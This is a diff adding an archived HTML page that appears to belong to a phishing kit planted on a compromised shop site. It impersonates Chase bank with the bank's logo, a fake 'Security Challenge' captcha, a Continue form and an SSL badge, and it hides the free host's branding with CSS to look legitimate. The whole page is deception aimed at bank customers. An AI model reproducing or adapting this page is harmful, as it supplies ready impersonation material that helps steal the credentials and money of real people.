@@ -1,0 +1,86 @@
+<!-- URL =http://madrasbazaar.com/admin/controller/com/phpmakicapuphp/phpmakicapuphp--><!-- w =('MADRASBAZAAR.COM', datetime.datetime(2012, 11, 7, 20, 14, 8), datetime.datetime(2021, 11, 7, 20, 14, 8))--><!DOCTYPE html>
+<html class="no-js" lang="">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="ie=edge" http-equiv="x-ua-compatible"/>
+  <title>
+   Please Enter Security Challenge
+  </title>
+  <meta content="noindex, nofollow, noimageindex" name="robots"/>
+  <meta content="" name="description"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <link href="./dashboard/index_files/styles.css" media="all" rel="stylesheet" type="text/css"/>
+  <link crossorigin="anonymous" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" rel="stylesheet"/>
+  <link href="assets/css/cap.css" rel="stylesheet"/>
+ </head>
+ <body class="home">
+  <input id="link" type="hidden" value=""/>
+  <!--<div class="loading text-center" id="loading"></div>-->
+  <div class="homWrapper">
+   <div class="col-auto">
+    <div class="captcha-wrapper">
+     <div class="logo">
+     </div>
+     <div class="form">
+      <div class="logo">
+       <div align="center">
+       </div>
+      </div>
+      <h2>
+       <img height="82" src="assets/img/263-2636562_chase-bank-logo-chase-bank-logo-png.png" width="301"/>
+       Security Challenge
+      </h2>
+      <p>
+       Type the characters you see in the image for security purposes.
+      </p>
+      <!--                        <div id="captcha" data-cap="-->
+      <?//= $captcha_string?>
+      <!--"></div>-->
+      <img id="captcha_image" src="dashboard/captcha.php?rand=1236667344"/>
+      <form action="" method="post">
+       <p>
+        <input class="input" name="captcha" placeholder="Captcha code" type="text"/>
+       </p>
+       <button class="btn btn--primary btn--block" type="submit">
+        Continue
+       </button>
+       <p>
+       </p>
+       <p>
+        <img height="28" src="assets/img/ssl.png" width="126"/>
+       </p>
+      </form>
+     </div>
+    </div>
+   </div>
+  </div>
+  <!-- End  Wrapper -->
+  <script crossorigin="anonymous" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" src="https://code.jquery.com/jquery-3.2.1.slim.min.js">
+  </script>
+  <script crossorigin="anonymous" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js">
+  </script>
+  <script crossorigin="anonymous" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js">
+  </script>
+  <script src="assets/js/bundle.js">
+  </script>
+  <script src="assets/js/loader.js">
+  </script>
+  <!--<script>-->
+  <!--    var canv = document.createElement("canvas");-->
+  <!--    canv.id = "captcha";-->
+  <!--    canv.width = 100;-->
+  <!--    canv.height = 50;-->
+  <!--    var ctx = canv.getContext("2d"),-->
+  <!--        captcha = document.getElementById('captcha');-->
+  <!--    ctx.font = "25px Georgia";-->
+  <!--    ctx.strokeText(captcha.dataset.cap, 0, 30);-->
+  <!--    //storing captcha so that can validate you can save it somewhere else according to your specific requirements-->
+  <!--    // code = captcha.join("");-->
+  <!--    captcha.appendChild(canv); // adds-->
+  <!--</script>-->
+  <style>
+   img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
+    display: none;}
+  </style>
+ </body>
+</html>
